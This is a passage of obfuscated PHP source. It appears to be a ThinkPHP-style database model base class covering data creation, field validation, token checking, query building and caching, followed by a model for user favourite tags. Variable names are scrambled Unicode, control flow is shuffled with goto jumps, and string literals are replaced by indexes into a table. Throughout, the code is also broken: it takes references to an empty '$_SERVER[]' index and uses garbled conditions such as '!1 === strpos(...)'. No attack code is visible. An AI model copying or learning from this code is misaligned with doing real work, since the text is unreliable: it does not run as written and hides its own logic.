$f : 1; } if ($f === $a˭[243]) { unset($Dƌ[$a˭[280]]); } $Eب = $this->db->select($Dƌ); if (!empty($Eب)) { if ($f === $a˭[243]) { return reset($Eب[0]); } if (!0 !== $f && 1 == $Dƌ[$a˭[280]]) { return reset($Eب[0]); } foreach ($Eب as $Aޖ) { $B[] = $Aޖ[$Cݻ]; } return $B; } } return null; } public function create($c˗ = '', $C҉ = '') { goto cƆ; dꆓ: if (isset($Dۯͱ)) { if (is_string($Dۯͱ)) { $Dۯͱ = explode($AҦ[47], $Dۯͱ); } if (think_config($AҦ[286])) { $Dۯͱ[] = think_config($AҦ[287]); } foreach ($c˗ as $A => $E) { if (!in_array($A, $Dۯͱ)) { unset($c˗[$A]); } } } if (!$this->autoValidation($c˗, $C҉)) { return !1; } if (!$this->autoCheckToken($c˗)) { $this->error = think_lang($AҦ[288]); return !1; } goto Fډ݊; Fډ݊: if ($this->autoCheckFields) { $Dۯͱ = $this->getDbFields(); foreach ($c˗ as $A => $E) { if (!in_array($A, $Dۯͱ)) { unset($c˗[$A]); } elseif (MAGIC_QUOTES_GPC && is_string($E)) { $c˗[$A] = stripslashes($E); } } } $this->autoOperation($c˗, $C҉); $this->data = $c˗; goto BɄܽ; C߷: $c˗ = $this->parseFieldsMap($c˗, 0); $C҉ = $C҉ ? $C҉ : (!empty($c˗[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$AҦ[261]])) { $Dۯͱ = $this->options[$AҦ[261]]; unset($this->options[$AҦ[261]]); } elseif ($C҉ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Dۯͱ = $this->insertFields; } elseif ($C҉ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Dۯͱ = $this->updateFields; } goto dꆓ; cƆ: $AҦ =& $_SERVER[]; if (empty($c˗)) { $c˗ = $_POST; } elseif (is_object($c˗)) { $c˗ = get_object_vars($c˗); } if (empty($c˗) || !is_array($c˗)) { $this->error = think_lang($AҦ[259]); return !1; } goto C߷; BɄܽ: return $c˗; goto c޺; c޺: } public function autoCheckToken($fĐ) { $c =& $_SERVER[]; if (isset($this->options[$c[289]]) && !$this->options[$c[289]]) { return !0; } if (think_config($c[286])) { $Eƌ = think_config($c[287]); if (!isset($fĐ[$Eƌ]) || Session::get($Eƌ)) { return !1; } list($Eȣ, $aǪ԰) = explode($c[70], $fĐ[$Eƌ]); if ($aǪ԰ && Session::get($Eƌ . $c[91] . $Eȣ) === $aǪ԰) { Session::remove($Eƌ . $c[91] . $Eȣ); return !0; } if (think_config($c[290])) { Session::remove($Eƌ . $c[91] . $Eȣ); } return !1; } return !0; } public function regex($Bӱ, $C) { $dᆙ榌 =& $_SERVER[]; $dΦ = array($dᆙ榌[291] => $dᆙ榌[292], $dᆙ榌[293] => $dᆙ榌[294], $dᆙ榌[295] => $dᆙ榌[296], $dᆙ榌[297] => $dᆙ榌[298], $dᆙ榌[299] => $dᆙ榌[300], $dᆙ榌[301] => $dᆙ榌[302], $dᆙ榌[303] => $dᆙ榌[304], $dᆙ榌[278] => $dᆙ榌[305], $dᆙ榌[306] => $dᆙ榌[307]); if (isset($dΦ[strtolower($C)])) { $C = $dΦ[strtolower($C)]; } return preg_match($C, $Bӱ) === 1; } private function autoOperation(&$D, $c) { $CǠ =& $_SERVER[]; if (!empty($this->options[$CǠ[308]])) { $C = $this->options[$CǠ[308]]; unset($this->options[$CǠ[308]]); } elseif (!empty($this->_auto)) { $C = $this->_auto; } if (isset($C)) { foreach ($C as $D) { if (empty($D[2])) { $D[2] = THINK_MODEL_INSERT; } if ($c == $D[2] || $D[2] == THINK_MODEL_BOTH) { switch (trim($D[3])) { case $CǠ[309]: case $CǠ[310]: $D枉 = isset($D[4]) ? (array) $D[4] : array(); if (isset($D[$D[0]])) { array_unshift($D枉, $D[$D[0]]); } if ($CǠ[309] == $D[3]) { $D[$D[0]] = call_user_func_array($D[1], $D枉); } else { $D[$D[0]] = call_user_func_array(array(&$this, $D[1]), $D枉); } break; case $CǠ[261]: $D[$D[0]] = $D[$D[1]]; break; case $CǠ[311]: if ($CǠ[33] === $D[$D[0]]) { unset($D[$D[0]]); } break; case $CǠ[312]: default: $D[$D[0]] = $D[1]; } if (!1 === $D[$D[0]]) { unset($D[$D[0]]); } } } } return $D; } protected function autoValidation($C̯, $bӃƳ) { $cν =& $_SERVER[]; if (!empty($this->options[$cν[313]])) { $e = $this->options[$cν[313]]; unset($this->options[$cν[313]]); } elseif (!empty($this->_validate)) { $e = $this->_validate; } if (isset($e)) { if ($this->patchValidate) { $this->error = array(); } foreach ($e as $c => $Dت) { if (empty($Dت[5]) || $Dت[5] == THINK_MODEL_BOTH || $Dت[5] == $bӃƳ) { if (0 == strpos($Dت[2], $cν[314]) && strpos($Dت[2], $cν[315])) { $Dت[2] = think_lang(substr($Dت[2], 2, -1)); } $Dت[3] = isset($Dت[3]) ? $Dت[3] : THINK_EXISTS_VALIDATE; $Dت[4] = isset($Dت[4]) ? $Dت[4] : $cν[316]; switch ($Dت[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($C̯, $Dت)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($cν[33] != trim($C̯[$Dت[0]])) { if (!1 === $this->_validationField($C̯, $Dت)) { return !1; } } break; default: if (isset($C̯[$Dت[0]])) { if (!1 === $this->_validationField($C̯, $Dت)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Bү, $b׏) { if (!1 === $this->_validationFieldItem($Bү, $b׏)) { if ($this->patchValidate) { $this->error[$b׏[0]] = $b׏[2]; } else { $this->error = $b׏[2]; return !1; } } return; } protected function _validationFieldItem($C󣬣׵, $C¢) { $Dڸ =& $_SERVER[]; switch (strtolower(trim($C¢[4]))) { case $Dڸ[309]: case $Dڸ[310]: $b = isset($C¢[6]) ? (array) $C¢[6] : array(); if (is_string($C¢[0]) && strpos($C¢[0], $Dڸ[47])) { $C¢[0] = explode($Dڸ[47], $C¢[0]); } if (is_array($C¢[0])) { foreach ($C¢[0] as $F) { $D̙[$F] = $C󣬣׵[$F]; } array_unshift($b, $D̙); } else { array_unshift($b, $C󣬣׵[$C¢[0]]); } if ($Dڸ[309] == $C¢[4]) { return call_user_func_array($C¢[1], $b); } else { return call_user_func_array(array(&$this, $C¢[1]), $b); } case $Dڸ[317]: return $C󣬣׵[$C¢[0]] == $C󣬣׵[$C¢[1]]; case $Dڸ[318]: if (is_string($C¢[0]) && strpos($C¢[0], $Dڸ[47])) { $C¢[0] = explode($Dڸ[47], $C¢[0]); } $e = array(); if (is_array($C¢[0])) { foreach ($C¢[0] as $F) { $e[$F] = $C󣬣׵[$F]; } } else { $e[$C¢[0]] = $C󣬣׵[$C¢[0]]; } if (!empty($C󣬣׵[$this->getPk()])) { $e[$this->getPk()] = array($Dڸ[319], $C󣬣׵[$this->getPk()]); } if ($this->where($e)->find()) { return !1; } return !0; default: return $this->check($C󣬣׵[$C¢[0]], $C¢[1], $C¢[4]); } } public function check($EӃ覐, $fз, $c鍻 = "\x72\145\x67\x65\x78") { $Aᎃ =& $_SERVER[]; $c鍻 = strtolower(trim($c鍻)); switch ($c鍻) { case $Aᎃ[7]: case $Aᎃ[320]: $bԿ = is_array($fз) ? $fз : explode($Aᎃ[47], $fз); return $c鍻 == $Aᎃ[7] ? in_array($EӃ覐, $bԿ) : !in_array($EӃ覐, $bԿ); case $Aᎃ[321]: case $Aᎃ[322]: if (is_array($fз)) { $A侀 = $fз[0]; $e = $fз[1]; } else { list($A侀, $e) = explode($Aᎃ[47], $fз); } return $c鍻 == $Aᎃ[321] ? $EӃ覐 >= $A侀 && $EӃ覐 <= $e : $EӃ覐 < $A侀 || $EӃ覐 > $e; case $Aᎃ[323]: case $Aᎃ[324]: return $c鍻 == $Aᎃ[323] ? $EӃ覐 == $fз : $EӃ覐 != $fз; case $Aᎃ[325]: $a = mb_strlen($EӃ覐, $Aᎃ[326]); if (strpos($fз, $Aᎃ[47])) { list($A侀, $e) = explode($Aᎃ[47], $fз); return $a >= $A侀 && $a <= $e; } else { return $a == $fз; } case $Aᎃ[327]: list($cǷЬ, $C䉈䆓) = explode($Aᎃ[47], $fз); if (!is_numeric($cǷЬ)) { $cǷЬ = strtotime($cǷЬ); } if (!is_numeric($C䉈䆓)) { $C䉈䆓 = strtotime($C䉈䆓); } return NOW_TIME >= $cǷЬ && NOW_TIME <= $C䉈䆓; case $Aᎃ[328]: return in_array(get_client_ip(), explode($Aᎃ[47], $fз)); case $Aᎃ[329]: return !in_array(get_client_ip(), explode($Aᎃ[47], $fз)); case $Aᎃ[316]: default: return $this->regex($EӃ覐, $fз); } } public function query($fιȭ, $EǾ = false) { $eѾ =& $_SERVER[]; if (!is_bool($EǾ) && !is_array($EǾ)) { $EǾ = func_get_args(); array_shift($EǾ); } $fιȭ = str_replace(array($eѾ[217], $eѾ[330]), $eѾ[50], $fιȭ); $fιȭ = $this->parseSql($fιȭ, $EǾ); return $this->db->query($fιȭ); } public function execute($A, $c = false) { if (!is_bool($c) && !is_array($c)) { $c = func_get_args(); array_shift($c); } $A = $this->parseSql($A, $c); return $this->db->execute($A); } protected function parseSql($c䞂, $Fћᫌ) { $aȆ =& $_SERVER[]; if (!0 === $Fћᫌ) { $C֮Ʉ = $this->_parseOptions(); $c䞂 = $this->db->parseSql($c䞂, $C֮Ʉ); } elseif (is_array($Fћᫌ)) { $Fћᫌ = array_map(array($this->db, $aȆ[331]), $Fћᫌ); $c䞂 = vsprintf($c䞂, $Fћᫌ); } else { $c䞂 = strtr($c䞂, array($aȆ[332] => $this->getTableName(), $aȆ[333] => think_config($aȆ[232]))); } $this->db->setModel($this->name); return $c䞂; } public function db($dɿ = '', $dЧ = '', $eѫ = array()) { goto FЮĈ; f: static $C = array(); if (!isset($C[$dɿ]) || isset($C[$dɿ]) && $dЧ && $aϑϟ[$dɿ] != $dЧ) { if (!empty($dЧ) && is_string($dЧ) && !1 === strpos($dЧ, $Cη[8])) { $dЧ = think_config($dЧ); } $C[$dɿ] = Db::getInstance($dЧ); } elseif (NULL === $dЧ) { $C[$dɿ]->close(); unset($C[$dɿ]); return; } if (!empty($eѫ)) { if (is_string($eѫ)) { parse_str($eѫ, $eѫ); } foreach ($eѫ as $dҧ蒐 => $dĹǵ) { $this->setProperty($dҧ蒐, $dĹǵ); } } goto dԇО; dԇО: $aϑϟ[$dɿ] = $dЧ; $this->db = $C[$dɿ]; $this->_after_db(); goto dʟ; FЮĈ: $Cη =& $_SERVER[]; if ($Cη[33] === $dɿ && $this->db) { return $this->db; } static $aϑϟ = array(); goto f; dʟ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto bȳ݇; bȳ݇: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Bƿ = get_class($this); if ($Bƿ == $_SERVER[][334]) { return $this->name; } $this->name = substr($Bƿ, 0, -5); } return $this->name; } public function getTableName() { $dʋ =& $_SERVER[]; if (empty($this->trueTableName)) { $E߾ = !empty($this->tablePrefix) ? $this->tablePrefix : $dʋ[33]; if (!empty($this->tableName)) { $E߾ .= $this->tableName; } else { $E߾ .= think_parse_name($this->name); } $this->trueTableName = strtolower($E߾); } return (!empty($this->dbName) ? $this->dbName . $dʋ[91] : $dʋ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eՉ =& $_SERVER[]; return isset($this->fields[$eՉ[239]]) ? $this->fields[$eՉ[239]] : $this->pk; } public function getDbFields() { $C =& $_SERVER[]; if (isset($this->options[$C[267]])) { $fȊ = $this->db->getFields($this->options[$C[267]]); return $fȊ ? array_keys($fȊ) : !1; } if ($this->fields) { $fȊ = $this->fields; unset($fȊ[$C[238]], $fȊ[$C[239]], $fȊ[$C[240]], $fȊ[$C[237]]); return $fȊ; } return !1; } public function data($Cؙ = '') { $a⋽ =& $_SERVER[]; if ($a⋽[33] === $Cؙ && !empty($this->data)) { return $this->data; } if (is_object($Cؙ)) { $Cؙ = get_object_vars($Cؙ); } elseif (is_string($Cؙ)) { parse_str($Cؙ, $Cؙ); } elseif (!is_array($Cؙ)) { think_exception(think_lang($a⋽[259])); } $this->data = $Cؙ; return $this; } public function join($B޻⼾ȏ) { $E =& $_SERVER[]; if (is_array($B޻⼾ȏ)) { $this->options[$E[270]] = $B޻⼾ȏ; } elseif (!empty($B޻⼾ȏ)) { $this->options[$E[270]][] = $B޻⼾ȏ; } return $this; } public function union($eЈ̋, $dȤ = false) { goto f; f: $c® =& $_SERVER[]; if (empty($eЈ̋)) { return $this; } if ($dȤ) { $this->options[$c®[335]][$c®[336]] = !0; } goto e؋; e؋: if (is_object($eЈ̋)) { $eЈ̋ = get_object_vars($eЈ̋); } if (is_string($eЈ̋)) { $B = $eЈ̋; } elseif (is_array($eЈ̋)) { if (isset($eЈ̋[0])) { $this->options[$c®[335]] = array_merge($this->options[$c®[335]], $eЈ̋); return $this; } else { $B = $eЈ̋; } } else { think_exception(think_lang($c®[259])); } $this->options[$c®[335]][] = $B; goto Eا; Eا: return $this; goto B仂; B仂: } public function cache($c = true, $Cϟ = null, $d = '') { $F乗 =& $_SERVER[]; if (!1 !== $c) { $this->options[$F乗[337]] = array($F乗[89] => $c, $F乗[327] => $Cϟ, $F乗[29] => $d); } return $this; } public function field($Eܢ, $Dʫ = false) { $A =& $_SERVER[]; if (!0 === $Eܢ) { $c = $this->getDbFields(); $Eܢ = $c ? $c : $A[176]; } elseif ($Dʫ) { if (is_string($Eܢ)) { $Eܢ = explode($A[47], $Eܢ); } $c = $this->getDbFields(); $Eܢ = $c ? array_diff($c, $Eܢ) : $Eܢ; } $this->options[$A[261]] = $Eܢ; return $this; } public function scope($C٭ޤ = '', $C = NULL) { $B˟ =& $_SERVER[]; if ($B˟[33] === $C٭ޤ) { if (isset($this->_scope[$B˟[34]])) { $AϪ = $this->_scope[$B˟[34]]; } else { return $this; } } elseif (is_string($C٭ޤ)) { $f = explode($B˟[47], $C٭ޤ); $AϪ = array(); foreach ($f as $eբ) { if (!isset($this->_scope[$eբ])) { continue; } $AϪ = array_merge($AϪ, $this->_scope[$eբ]); } if (!empty($C) && is_array($C)) { $AϪ = array_merge($AϪ, $C); } } elseif (is_array($C٭ޤ)) { $AϪ = $C٭ޤ; } if (is_array($AϪ) && !empty($AϪ)) { $this->options = array_merge($this->options, array_change_key_case($AϪ)); } return $this; } public function where($cό㡪, $B̠ꎧ = null) { $bἏ =& $_SERVER[]; if (!is_null($B̠ꎧ) && is_string($cό㡪)) { if (!is_array($B̠ꎧ)) { $B̠ꎧ = func_get_args(); array_shift($B̠ꎧ); } $B̠ꎧ = array_map(array($this->db, $bἏ[331]), $B̠ꎧ); $cό㡪 = vsprintf($cό㡪, $B̠ꎧ); } elseif (is_object($cό㡪)) { $cό㡪 = get_object_vars($cό㡪); } elseif (is_array($cό㡪)) { foreach ($cό㡪 as $c揫֢ => $B󋍻) { if ((is_numeric($c揫֢) || !$c揫֢) && is_string($B󋍻)) { think_trace($bἏ[338], $bἏ[33], $bἏ[46]); die; } } } if (is_string($cό㡪) && $bἏ[33] != $cό㡪) { $eݤۮΆ = array(); $eݤۮΆ[$bἏ[339]] = $cό㡪; $cό㡪 = $eݤۮΆ; } if (isset($this->options[$bἏ[263]])) { $this->options[$bἏ[263]] = array_merge($this->options[$bἏ[263]], $cό㡪); } else { $this->options[$bἏ[263]] = $cό㡪; } return $this; } public function limit($F߱, $aޓ = null) { $C꧊ =& $_SERVER[]; $this->options[$C꧊[280]] = is_null($aޓ) ? $F߱ : $F߱ . $C꧊[47] . $aޓ; return $this; } public function page($a᩽, $F堹 = null) { $C =& $_SERVER[]; $this->options[$C[340]] = is_null($F堹) ? $a᩽ : $a᩽ . $C[47] . $F堹; return $this; } public function comment($bԐ) { $this->options[$_SERVER[][341]] = $bԐ; return $this; } public function setProperty($eد, $Eǐˆ) { if (property_exists($this, $eد)) { $this->{$eد} = $Eǐˆ; } return $this; } } goto cϒ; a: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\141\166"; protected function cacheFunctionAlias($d撒) { $Fӭؗ =& $_SERVER[]; return array($Fӭؗ[2506] => array(USER_ID, $Fӭؗ[2561])); } protected function listData() { $c㫚✐ =& $_SERVER[]; $e糼 = array($c㫚✐[1444] => USER_ID, $c㫚✐[436] => array($c㫚✐[2562], 0)); $C릢 = $c㫚✐[2563]; $cٌ = $c㫚✐[2564]; $a = $this->field($C릢)->where($e糼)->order($cٌ)->select(); return $a ? $a : array(); } protected function listByTag($Aԕ) { } protected function addToTag($A, $A朧) { $cȣ =& $_SERVER[]; if (!Model($cȣ[2334])->listData($A朧) || !Model($cȣ[772])->pathInfo($A)) { return !1; } $cƹЦ = array($cȣ[1444] => USER_ID, $cȣ[436] => $A朧, $cȣ[387] => $A, $cȣ[388] => $cȣ[382], $cȣ[386] => $cȣ[33], $cȣ[2125] => 0); if ($this->where($cƹЦ)->find()) { return !1; } return $this->add($cƹЦ); } protected function removeFromTag($Bӛ, $Aֶ) { $Fݬ =& $_SERVER[]; if (!Model($Fݬ[2334])->listData($Aֶ)) { return !1; } if (is_array($Bӛ)) { $Bӛ = array($Fݬ[7], $Bӛ); } $fݫ = array($Fݬ[1444] => USER_ID, $Fݬ[436] => $Aֶ, $Fݬ[388] => $Fݬ[382], $Fݬ[387] => $Bӛ); return $this->where($fݫ)->delete(); } protected function removeByTag($DԂ) { $a =& $_SERVER[]; if (!$DԂ) { return !1; } $c׽ = array($a[1444] => USER_ID, $a[436] => $DԂ); return $this->where($c׽)->delete(); } protected function removeBySource($C̬袑) { $Bڣ =& $_SERVER[]; $Eޣ = array($Bڣ[1444] => USER_ID, $Bڣ[387] => $C̬袑, $Bڣ[436] => array($Bڣ[943], 0)); return $this->where($Eޣ)->delete(); } }